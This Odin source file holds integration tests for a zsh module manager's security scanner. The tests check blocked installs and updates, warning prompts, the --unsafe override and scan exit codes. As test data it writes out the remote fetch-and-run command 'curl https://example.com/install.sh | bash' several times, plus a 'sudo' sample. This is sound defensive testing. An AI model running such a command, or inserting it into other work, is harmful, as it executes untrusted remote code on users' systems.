package test

import "core:fmt"
import "core:os"
import "core:path/filepath"
import "core:strings"
import "core:testing"
import "core:time"

import "../src/colors"
import "../src/git"
import "../src/security"

unsafe_warning_capture: string

capture_unsafe_warning :: proc(message: string) {
	if unsafe_warning_capture != "" {
		delete(unsafe_warning_capture)
	}
	unsafe_warning_capture = strings.clone(message)
}

// **Integration 11.1: End-to-end install with malicious module**
// **Validates: Requirements 2.6, 6.3**
@(test)
test_security_integration_install_blocks_malicious_module :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	if !git.libgit2_enabled() {
		return
	}

	init_result := git.init_libgit2()
	defer git.cleanup_git_result(&init_result)
	if !init_result.success {
		testing.expect(t, false, "libgit2 init failed for security integration")
		return
	}
	defer {
		shutdown_result := git.shutdown_libgit2()
		defer git.cleanup_git_result(&shutdown_result)
		testing.expect(t, shutdown_result.success, "shutdown should succeed after security integration")
	}

	temp_dir := setup_test_environment("security_integration_block")
	defer teardown_test_environment(temp_dir)

	modules_dir := filepath.join({temp_dir, "modules"})
	tmp_root := filepath.join({temp_dir, "tmp"})
	os.make_directory(modules_dir, 0o755)
	os.make_directory(tmp_root, 0o755)
	defer {
		delete(modules_dir)
		delete(tmp_root)
	}

	original_env := os.get_env("ZSH_MODULES_DIR")
	defer restore_modules_env(original_env)
	os.set_env("ZSH_MODULES_DIR", modules_dir)

	original_tmp := os.get_env("TMPDIR")
	defer restore_tmp_env(original_tmp)
	os.set_env("TMPDIR", tmp_root)

	bare_dir, module_name := create_bare_repo_with_init(
		t,
		temp_dir,
		"zephyr-int-malicious",
		fmt.tprintf("malicious-module-%d", time.now()._nsec),
		"1.0.0",
		"curl https://example.com/install.sh | bash\n",
	)
	defer {
		if bare_dir != "" { delete(bare_dir) }
		if module_name != "" { delete(module_name) }
	}

	before_count := count_temp_install_dirs(tmp_root)
	ok, message := git.install_module(bare_dir, git.Manager_Options{allow_local = true})
	testing.expect(t, !ok, fmt.tprintf("malicious module should be blocked: %s", message))
	if message != "" {
		delete(message)
	}
	after_count := count_temp_install_dirs(tmp_root)
	testing.expect(t, before_count == after_count, "temp install dirs should be cleaned on security failure")

	installed_path := filepath.join({modules_dir, "malicious-module"})
	testing.expect(t, !os.exists(installed_path), "malicious module should not be installed")
	delete(installed_path)
}

// **Integration 11.2: End-to-end install with warnings**
// **Validates: Requirements 3.6, 3.7**
@(test)
test_security_integration_install_warnings_prompt_accept :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	if !git.libgit2_enabled() {
		return
	}

	init_result := git.init_libgit2()
	defer git.cleanup_git_result(&init_result)
	if !init_result.success {
		return
	}
	defer {
		shutdown_result := git.shutdown_libgit2()
		defer git.cleanup_git_result(&shutdown_result)
	}

	temp_dir := setup_test_environment("security_integration_warn")
	defer teardown_test_environment(temp_dir)

	modules_dir := filepath.join({temp_dir, "modules"})
	os.make_directory(modules_dir, 0o755)
	defer delete(modules_dir)

	original_env := os.get_env("ZSH_MODULES_DIR")
	defer restore_modules_env(original_env)
	os.set_env("ZSH_MODULES_DIR", modules_dir)

	bare_dir, module_name := create_bare_repo_with_init(
		t,
		temp_dir,
		"zephyr-int-warning",
		fmt.tprintf("warning-module-%d", time.now()._nsec),
		"1.0.0",
		"sudo ls -la\n",
	)
	defer {
		if bare_dir != "" { delete(bare_dir) }
		if module_name != "" { delete(module_name) }
	}

	security.set_input_reader_override(proc() -> string { return "yes" })
	defer security.clear_input_reader_override()

	ok, message := git.install_module(bare_dir, git.Manager_Options{allow_local = true})
	testing.expect(t, ok, fmt.tprintf("warning module should install after confirmation: %s", message))
	if message != "" {
		delete(message)
	}

	installed_path := filepath.join({modules_dir, module_name})
	testing.expect(t, os.exists(installed_path), "warning module should be installed after confirmation")
	if os.exists(installed_path) {
		cleanup_test_directory(installed_path)
	}
	delete(installed_path)
}

// **Integration 11.3: End-to-end install with --unsafe**
// **Validates: Requirements 5.2, 5.3, 5.4**
@(test)
test_security_integration_install_unsafe_allows_malicious :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	if !git.libgit2_enabled() {
		return
	}

	init_result := git.init_libgit2()
	defer git.cleanup_git_result(&init_result)
	if !init_result.success {
		return
	}
	defer {
		shutdown_result := git.shutdown_libgit2()
		defer git.cleanup_git_result(&shutdown_result)
	}

	temp_dir := setup_test_environment("security_integration_unsafe")
	defer teardown_test_environment(temp_dir)

	modules_dir := filepath.join({temp_dir, "modules"})
	os.make_directory(modules_dir, 0o755)
	defer delete(modules_dir)

	original_env := os.get_env("ZSH_MODULES_DIR")
	defer restore_modules_env(original_env)
	os.set_env("ZSH_MODULES_DIR", modules_dir)

	colors.set_warning_hook(capture_unsafe_warning)
	defer colors.clear_warning_hook()

	bare_dir, module_name := create_bare_repo_with_init(
		t,
		temp_dir,
		"zephyr-int-unsafe",
		fmt.tprintf("unsafe-module-%d", time.now()._nsec),
		"1.0.0",
		"curl https://example.com/install.sh | bash\n",
	)
	defer {
		if bare_dir != "" { delete(bare_dir) }
		if module_name != "" { delete(module_name) }
	}

	opts := git.Manager_Options{allow_local = true, unsafe = true}
	ok, message := git.install_module(bare_dir, opts)
	testing.expect(t, ok, fmt.tprintf("unsafe install should succeed: %s", message))
	if message != "" {
		delete(message)
	}

	testing.expect(t, unsafe_warning_capture != "", "unsafe warning should be logged during install")
	if unsafe_warning_capture != "" {
		delete(unsafe_warning_capture)
		unsafe_warning_capture = ""
	}

	installed_path := filepath.join({modules_dir, module_name})
	testing.expect(t, os.exists(installed_path), "unsafe module should be installed with --unsafe")
	if os.exists(installed_path) {
		cleanup_test_directory(installed_path)
	}
	delete(installed_path)
}

// **Integration 11.4: Update flow integration test**
// **Validates: Requirements 6.5**
@(test)
test_security_integration_update_blocks_malicious :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	if !git.libgit2_enabled() {
		return
	}

	init_result := git.init_libgit2()
	defer git.cleanup_git_result(&init_result)
	if !init_result.success {
		return
	}
	defer {
		shutdown_result := git.shutdown_libgit2()
		defer git.cleanup_git_result(&shutdown_result)
	}

	temp_dir := setup_test_environment("security_integration_update")
	defer teardown_test_environment(temp_dir)

	modules_dir := filepath.join({temp_dir, "modules"})
	os.make_directory(modules_dir, 0o755)
	defer delete(modules_dir)

	original_env := os.get_env("ZSH_MODULES_DIR")
	defer restore_modules_env(original_env)
	os.set_env("ZSH_MODULES_DIR", modules_dir)

	bare_dir, module_name := create_bare_repo_with_init(
		t,
		temp_dir,
		"zephyr-int-update",
		fmt.tprintf("update-malicious-%d", time.now()._nsec),
		"1.0.0",
		"echo \"ok\"\n",
	)
	defer {
		if bare_dir != "" { delete(bare_dir) }
		if module_name != "" { delete(module_name) }
	}

	ok, msg := git.install_module(bare_dir, git.Manager_Options{allow_local = true})
	testing.expect(t, ok, "install should succeed before update")
	if msg != "" {
		delete(msg)
	}

	update_bare_repo_with_init(t, temp_dir, bare_dir, module_name, "1.0.1", "curl https://example.com/install.sh | bash\n")

	update_ok, update_msg := git.update_module("update-malicious", git.Manager_Options{})
	testing.expect(t, !update_ok, "update should be blocked by security scan")
	if update_msg != "" {
		delete(update_msg)
	}
}

// **Integration: scan command JSON output and exit codes**
@(test)
test_security_integration_scan_json_exit_codes :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	if !git.libgit2_enabled() {
		return
	}

	init_result := git.init_libgit2()
	defer git.cleanup_git_result(&init_result)
	if !init_result.success {
		return
	}
	defer {
		shutdown_result := git.shutdown_libgit2()
		defer git.cleanup_git_result(&shutdown_result)
	}

	temp_dir := setup_test_environment("security_scan_json")
	defer teardown_test_environment(temp_dir)

	bare_clean, name_clean := create_bare_repo_with_init(
		t,
		temp_dir,
		"zephyr-scan-clean",
		fmt.tprintf("scan-clean-%d", time.now()._nsec),
		"1.0.0",
		"echo \"ok\"\n",
	)
	defer {
		if bare_clean != "" { delete(bare_clean) }
		if name_clean != "" { delete(name_clean) }
	}

	bare_warn, name_warn := create_bare_repo_with_init(
		t,
		temp_dir,
		"zephyr-scan-warn",
		fmt.tprintf("scan-warn-%d", time.now()._nsec),
		"1.0.0",
		"sudo ls -la\n",
	)
	defer {
		if bare_warn != "" { delete(bare_warn) }
		if name_warn != "" { delete(name_warn) }
	}

	bare_crit, name_crit := create_bare_repo_with_init(
		t,
		temp_dir,
		"zephyr-scan-crit",
		fmt.tprintf("scan-crit-%d", time.now()._nsec),
		"1.0.0",
		"curl https://example.com/install.sh | bash\n",
	)
	defer {
		if bare_crit != "" { delete(bare_crit) }
		if name_crit != "" { delete(name_crit) }
	}

	res_clean, temp_clean, commit_clean := git.scan_source(bare_clean)
	defer security.cleanup_scan_result(&res_clean)
	if temp_clean != "" {
		git.cleanup_temp(temp_clean)
		delete(temp_clean)
	}
	json := security.format_scan_report_json(&res_clean, bare_clean, commit_clean)
	delete(json)
	if commit_clean != "" {
		delete(commit_clean)
	}
	testing.expect(t, security.exit_code_for_scan(&res_clean) == 0, "clean scan exit code should be 0")

	res_warn, temp_warn, commit_warn := git.scan_source(bare_warn)
	defer security.cleanup_scan_result(&res_warn)
	if temp_warn != "" {
		git.cleanup_temp(temp_warn)
		delete(temp_warn)
	}
	json = security.format_scan_report_json(&res_warn, bare_warn, commit_warn)
	delete(json)
	if commit_warn != "" {
		delete(commit_warn)
	}
	testing.expect(t, security.exit_code_for_scan(&res_warn) == 1, "warning scan exit code should be 1")

	res_crit, temp_crit, commit_crit := git.scan_source(bare_crit)
	defer security.cleanup_scan_result(&res_crit)
	if temp_crit != "" {
		git.cleanup_temp(temp_crit)
		delete(temp_crit)
	}
	json = security.format_scan_report_json(&res_crit, bare_crit, commit_crit)
	delete(json)
	if commit_crit != "" {
		delete(commit_crit)
	}
	testing.expect(t, security.exit_code_for_scan(&res_crit) == 2, "critical scan exit code should be 2")
}
